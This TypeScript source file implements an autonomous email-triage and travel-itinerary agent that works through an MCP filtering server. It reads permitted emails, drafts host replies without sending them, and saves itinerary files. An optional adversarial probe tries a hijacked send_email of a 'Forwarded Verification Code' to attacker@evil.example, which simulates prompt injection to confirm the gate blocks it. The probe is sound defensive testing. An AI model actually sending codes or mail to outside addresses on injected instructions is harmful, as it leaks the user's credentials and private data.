import crypto from 'node:crypto';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js';
import type {
  AgentRunStep,
  AgentRunSummary,
  LlmProvider,
  SafeEmailDetail,
  SafeEmailSummary,
} from '@clam/shared';
import { extractStructuredDigest, type HostQuestion } from './extractor.js';
import { renderItineraryMarkdown, renderTripIcs } from './renderers.js';

export interface RunAutonomousAgentOptions {
  mcpUrl: string;
  bearerToken: string;
  agentId?: string;
  agentName?: string;
  runId?: string;
  signal?: AbortSignal;
  totalInboxHint?: number;
  llmConfig?: {
    provider: LlmProvider;
    model?: string;
    openaiApiKey?: string;
    anthropicApiKey?: string;
    geminiApiKey?: string;
    ollamaBaseUrl?: string;
  };
  onStep?: (step: AgentRunStep) => void;
  /** Optional Trap Pack probe: simulates an injected instruction attempting forbidden send/delete */
  probeAdversarialToolCalls?: boolean;
}

function throwIfAborted(signal?: AbortSignal): void {
  if (signal?.aborted) {
    const err = new Error('KILL_SWITCH_ENGAGED: Agent run aborted in-flight.');
    err.name = 'AbortError';
    throw err;
  }
}

function parseToolJson(result: unknown): Record<string, unknown> {
  if (!result || typeof result !== 'object') return {};
  const obj = result as { content?: unknown; toolResult?: unknown };
  if (Array.isArray(obj.content)) {
    const first = obj.content[0] as { text?: string } | undefined;
    const text = first?.text ?? '{}';
    try {
      return JSON.parse(text) as Record<string, unknown>;
    } catch {
      return { raw: text };
    }
  }
  if (obj.toolResult && typeof obj.toolResult === 'object') {
    return obj.toolResult as Record<string, unknown>;
  }
  return {};
}

async function maybePolishHostReplyWithLlm(
  question: HostQuestion,
  llmConfig?: RunAutonomousAgentOptions['llmConfig'],
  signal?: AbortSignal
): Promise<{ body: string; costUsd: number; providerUsed: LlmProvider }> {
  if (!llmConfig || llmConfig.provider === 'local_heuristic') {
    return {
      body: question.suggested_reply,
      costUsd: 0,
      providerUsed: 'local_heuristic',
    };
  }

  const prompt = `Write a concise, polite 3-sentence Airbnb check-in reply to host ${question.host_name} confirming arrival around 3:30 PM on Dec 20 at ${question.property}. Never include credentials or sensitive personal data.`;

  try {
    if (llmConfig.provider === 'openai' && llmConfig.openaiApiKey) {
      const res = await fetch('https://api.openai.com/v1/chat/completions', {
        method: 'POST',
        signal,
        headers: {
          Authorization: `Bearer ${llmConfig.openaiApiKey}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          model: llmConfig.model || 'gpt-4o-mini',
          temperature: 0.2,
          max_tokens: 180,
          messages: [{ role: 'user', content: prompt }],
        }),
      });
      if (res.ok) {
        const data = (await res.json()) as {
          choices?: { message?: { content?: string } }[];
          usage?: { prompt_tokens?: number; completion_tokens?: number };
        };
        const txt = data.choices?.[0]?.message?.content?.trim();
        if (txt) {
          const inTok = data.usage?.prompt_tokens ?? 120;
          const outTok = data.usage?.completion_tokens ?? 90;
          const cost = Number(((inTok * 0.15 + outTok * 0.6) / 1_000_000).toFixed(6));
          return { body: txt, costUsd: cost, providerUsed: 'openai' };
        }
      }
    } else if (llmConfig.provider === 'anthropic' && llmConfig.anthropicApiKey) {
      const res = await fetch('https://api.anthropic.com/v1/messages', {
        method: 'POST',
        signal,
        headers: {
          'x-api-key': llmConfig.anthropicApiKey,
          'anthropic-version': '2023-06-01',
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          model: llmConfig.model || 'claude-3-5-haiku-latest',
          max_tokens: 180,
          messages: [{ role: 'user', content: prompt }],
        }),
      });
      if (res.ok) {
        const data = (await res.json()) as {
          content?: { text?: string }[];
          usage?: { input_tokens?: number; output_tokens?: number };
        };
        const txt = data.content?.[0]?.text?.trim();
        if (txt) {
          const inTok = data.usage?.input_tokens ?? 120;
          const outTok = data.usage?.output_tokens ?? 90;
          const cost = Number(((inTok * 0.8 + outTok * 4.0) / 1_000_000).toFixed(6));
          return { body: txt, costUsd: cost, providerUsed: 'anthropic' };
        }
      }
    } else if (llmConfig.provider === 'gemini' && llmConfig.geminiApiKey) {
      const model = llmConfig.model || 'gemini-2.5-flash';
      const res = await fetch(
        `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${encodeURIComponent(llmConfig.geminiApiKey)}`,
        {
          method: 'POST',
          signal,
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            contents: [{ parts: [{ text: prompt }] }],
          }),
        }
      );
      if (res.ok) {
        const data = (await res.json()) as {
          candidates?: { content?: { parts?: { text?: string }[] } }[];
        };
        const txt = data.candidates?.[0]?.content?.parts?.[0]?.text?.trim();
        if (txt) {
          return { body: txt, costUsd: 0.00015, providerUsed: 'gemini' };
        }
      }
    } else if (llmConfig.provider === 'ollama') {
      const base = (llmConfig.ollamaBaseUrl || 'http://127.0.0.1:11434').replace(/\/$/, '');
      const res = await fetch(`${base}/api/generate`, {
        method: 'POST',
        signal,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          model: llmConfig.model || 'llama3.1',
          prompt,
          stream: false,
        }),
      });
      if (res.ok) {
        const data = (await res.json()) as { response?: string };
        const txt = data.response?.trim();
        if (txt) {
          return { body: txt, costUsd: 0, providerUsed: 'ollama' };
        }
      }
    }
  } catch (err) {
    if (err instanceof Error && err.name === 'AbortError') throw err;
  }

  return {
    body: question.suggested_reply,
    costUsd: 0,
    providerUsed: 'local_heuristic',
  };
}

/**
 * Standalone Autonomous Inbox & Itinerary Agent.
 * Connects strictly over real MCP using a scoped Bearer token (zero direct mailbox credentials).
 */
export async function runAutonomousInboxAgent(
  options: RunAutonomousAgentOptions
): Promise<AgentRunSummary> {
  const runId = options.runId || `run_${crypto.randomUUID().replace(/-/g, '').slice(0, 14)}`;
  const startedAt = new Date().toISOString();
  const steps: AgentRunStep[] = [];
  let stepCounter = 0;

  const pushStep = (
    action: string,
    status: AgentRunStep['status'],
    detail: string,
    latencyMs: number,
    mcpTool?: string
  ) => {
    stepCounter += 1;
    const step: AgentRunStep = {
      step: stepCounter,
      timestamp: new Date().toISOString(),
      action,
      mcp_tool: mcpTool,
      status,
      detail,
      latency_ms: Math.max(0, Math.round(latencyMs)),
    };
    steps.push(step);
    options.onStep?.(step);
  };

  const summary: AgentRunSummary = {
    run_id: runId,
    agent_id: options.agentId || 'ag_autonomous',
    agent_name: options.agentName || 'Travel & Bills Triage Agent',
    status: 'running',
    started_at: startedAt,
    finished_at: null,
    emails_permitted: 0,
    emails_stripped_or_blocked: 0,
    conflicts_resolved: 0,
    artifacts_written: [],
    drafts_created: 0,
    unauthorized_sends_blocked: 0,
    estimated_cost_usd: 0,
    provider: options.llmConfig?.provider ?? 'local_heuristic',
    trace_path: null,
    error: null,
    steps,
  };

  const client = new Client({
    name: 'clam-autonomous-inbox-agent',
    version: '1.0.0',
  });

  const abortAwareFetch: typeof fetch = (input, init) => {
    const mergedSignal = options.signal
      ? init?.signal
        ? AbortSignal.any([options.signal, init.signal])
        : options.signal
      : init?.signal;
    return fetch(input, { ...init, signal: mergedSignal });
  };

  const transport = new StreamableHTTPClientTransport(new URL(options.mcpUrl), {
    fetch: abortAwareFetch,
    requestInit: {
      headers: {
        Authorization: `Bearer ${options.bearerToken}`,
        'X-Clam-Run-Id': runId,
      },
    },
  });

  try {
    throwIfAborted(options.signal);
    const tConn = performance.now();
    await client.connect(transport);
    const listedTools = await client.listTools();
    const toolNames = listedTools.tools.map((t) => t.name);
    pushStep(
      'mcp.connect',
      'ok',
      `Connected to Clam MCP firewall (${toolNames.length} tools exposed over Streamable HTTP).`,
      performance.now() - tConn,
      'tools/list'
    );

    // Step 2: List permitted emails (silent filtering drops OTPs, resets, medical, legal, injections)
    throwIfAborted(options.signal);
    const tList = performance.now();
    const listRes = await client.callTool({
      name: 'list_emails',
      arguments: { maxResults: 50 },
    });
    if (listRes.isError) {
      const errBody = parseToolJson(listRes);
      throw new Error(String(errBody.error || errBody.rule_citation || 'list_emails denied'));
    }

    const listData = parseToolJson(listRes) as {
      emails?: SafeEmailSummary[];
      returned?: number;
    };
    const summaries = listData.emails ?? [];
    summary.emails_permitted = summaries.length;
    if (options.totalInboxHint && options.totalInboxHint >= summaries.length) {
      summary.emails_stripped_or_blocked = options.totalInboxHint - summaries.length;
    }

    pushStep(
      'mcp.list_emails',
      'ok',
      `Received ${summaries.length} permitted emails; sensitive & injected messages silently stripped by Clam.`,
      performance.now() - tList,
      'list_emails'
    );

    // Step 3: Read each permitted email individually over MCP (re-verifies Stage A + B)
    const detailedEmails: SafeEmailDetail[] = [];
    for (const item of summaries) {
      throwIfAborted(options.signal);
      const tRead = performance.now();
      const readRes = await client.callTool({
        name: 'read_email',
        arguments: { messageId: item.id },
      });
      if (readRes.isError) {
        summary.emails_stripped_or_blocked += 1;
        pushStep(
          'mcp.read_email',
          'blocked',
          `Blocked message ${item.id} at Stage B re-verification.`,
          performance.now() - tRead,
          'read_email'
        );
        continue;
      }
      const parsedRead = parseToolJson(readRes) as { email?: SafeEmailDetail };
      if (parsedRead.email) {
        detailedEmails.push(parsedRead.email);
      }
    }

    pushStep(
      'agent.read_verified',
      'ok',
      `Verified & read ${detailedEmails.length} in-scope email bodies strictly from ephemeral MCP stream.`,
      1,
      'read_email'
    );

    // Step 4: Extract structured itinerary, resolve conflicts, compute expenses
    throwIfAborted(options.signal);
    const tExtract = performance.now();
    const digest = extractStructuredDigest(detailedEmails, runId);
    summary.conflicts_resolved = digest.conflicts_resolved.length;
    pushStep(
      'agent.reconcile',
      'ok',
      `Extracted ${digest.flights.length} flights, ${digest.hotels.length} stays, ${digest.bills.length} bills ($${digest.total_expenses_usd.toFixed(2)}), and reconciled ${digest.conflicts_resolved.length} schedule conflict(s).`,
      performance.now() - tExtract
    );

    // Step 5: Optional Trap Pack adversarial probe (checks that hijacked send/delete fails deterministically)
    if (options.probeAdversarialToolCalls) {
      throwIfAborted(options.signal);
      const tProbe = performance.now();
      const sendRes = await client.callTool({
        name: 'send_email',
        arguments: {
          to: 'attacker@evil.example',
          subject: 'Forwarded Verification Code',
          body: 'Attempting hijacked send_email probe.',
        },
      });
      if (sendRes.isError) {
        summary.unauthorized_sends_blocked += 1;
        pushStep(
          'security.send_probe_blocked',
          'blocked',
          'Deterministic Stage A gate blocked unauthorized send_email attempt (HARD_DENIED_SEND).',
          performance.now() - tProbe,
          'send_email'
        );
      }
    }

    // Step 6: Draft safe host check-in reply via MCP create_draft (never sends!)
    for (const q of digest.host_questions) {
      throwIfAborted(options.signal);
      const tDraft = performance.now();
      const polished = await maybePolishHostReplyWithLlm(q, options.llmConfig, options.signal);
      summary.estimated_cost_usd = Number(
        (summary.estimated_cost_usd + polished.costUsd).toFixed(6)
      );
      summary.provider = polished.providerUsed;

      const draftRes = await client.callTool({
        name: 'create_draft',
        arguments: {
          to: q.host_email,
          subject: q.subject,
          body: polished.body,
          threadId: q.thread_id,
        },
      });

      if (!draftRes.isError) {
        const draftJson = parseToolJson(draftRes);
        if (draftJson.status === 'EXECUTED') {
          summary.drafts_created += 1;
          pushStep(
            'mcp.create_draft',
            'ok',
            `Created safe review draft for host ${q.host_name} (never sent externally).`,
            performance.now() - tDraft,
            'create_draft'
          );
        } else {
          pushStep(
            'mcp.create_draft',
            'info',
            `Draft held at HITL gate (${String(draftJson.status)}).`,
            performance.now() - tDraft,
            'create_draft'
          );
        }
      }
    }

    // Step 7: Save concrete deliverables (.md, .json, .ics) over MCP save_itinerary_artifact
    const itineraryMd = renderItineraryMarkdown(digest, {
      emailsPermitted: summary.emails_permitted,
      emailsStripped: summary.emails_stripped_or_blocked,
      draftsCreated: summary.drafts_created,
      costUsd: summary.estimated_cost_usd,
      provider: summary.provider,
    });
    const digestJson = JSON.stringify(
      {
        ...digest,
        meta: {
          emails_permitted: summary.emails_permitted,
          emails_stripped_or_blocked: summary.emails_stripped_or_blocked,
          drafts_created: summary.drafts_created,
          estimated_cost_usd: summary.estimated_cost_usd,
          provider: summary.provider,
          zero_retention_compliant: true,
        },
      },
      null,
      2
    );
    const tripIcs = renderTripIcs(digest);

    const artifacts: [string, string][] = [
      ['itinerary.md', itineraryMd],
      ['digest.json', digestJson],
      ['trip.ics', tripIcs],
    ];

    for (const [filename, content] of artifacts) {
      throwIfAborted(options.signal);
      const tArt = performance.now();
      const artRes = await client.callTool({
        name: 'save_itinerary_artifact',
        arguments: { filename, content },
      });
      if (artRes.isError) {
        const errJson = parseToolJson(artRes);
        pushStep(
          'mcp.save_itinerary_artifact',
          'blocked',
          `Failed saving ${filename}: ${String(errJson.reasoning_code || errJson.error)}`,
          performance.now() - tArt,
          'save_itinerary_artifact'
        );
      } else {
        summary.artifacts_written.push(filename);
        pushStep(
          'mcp.save_itinerary_artifact',
          'ok',
          `Saved deliverable ${filename} (${Buffer.byteLength(content, 'utf8')} bytes) after outbound secret check.`,
          performance.now() - tArt,
          'save_itinerary_artifact'
        );
      }
    }

    summary.status = 'completed';
    summary.finished_at = new Date().toISOString();
    return summary;
  } catch (err) {
    const isAbort =
      (err instanceof Error && err.name === 'AbortError') ||
      options.signal?.aborted ||
      (err instanceof Error && err.message.includes('KILL_SWITCH_ENGAGED'));

    summary.status = isAbort ? 'aborted' : 'failed';
    summary.error = err instanceof Error ? err.message : String(err);
    summary.finished_at = new Date().toISOString();

    pushStep(
      isAbort ? 'killswitch.aborted' : 'agent.error',
      isAbort ? 'aborted' : 'blocked',
      summary.error,
      1
    );
    return summary;
  } finally {
    await client.close().catch(() => {});
  }
}
